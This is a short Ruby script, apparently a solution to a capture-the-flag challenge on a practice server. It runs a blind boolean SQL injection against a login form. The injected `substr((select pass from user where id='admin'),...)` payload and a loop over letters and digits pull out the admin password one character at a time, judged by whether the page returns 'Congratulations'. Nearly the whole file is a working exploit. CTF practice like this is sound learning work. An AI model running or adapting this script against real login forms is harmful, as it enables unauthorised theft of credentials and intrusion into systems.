require 'net/http'
require 'uri'
require 'pp'
require 'pry'
require 'pry-nav'

$http = Net::HTTP.new('ctfq.sweetduet.info', 10080)
$path = '/~q6/'

def check(index, char)
  # http://www.atmarkit.co.jp/ait/articles/0608/26/news014_2.html
  vector = "' or substr((select pass from user where id='admin'),#{index},1)='#{char}' --"

  # query = "id=admin&pass=' or '1'='1' --"
  query = "id=admin&pass=#{vector}"
  # puts query

  response = $http.post($path, query)
  sleep 1

  response.body.include?("Congratulations")
end

# puts check(1, "F")
# puts check(2, "L")
# puts check(3, "A")
# puts check(4, "G")
# puts check(5, "_")

for i in 6..25
  found = false

  for c in ('A'..'Z').to_a + ('a'..'z').to_a + (0..9).to_a
    if check(i, c)
      puts "index #{i} is #{c}!"
      found = true
      break
    end
  end

  if !found
    puts "finished"
    break
  end
end
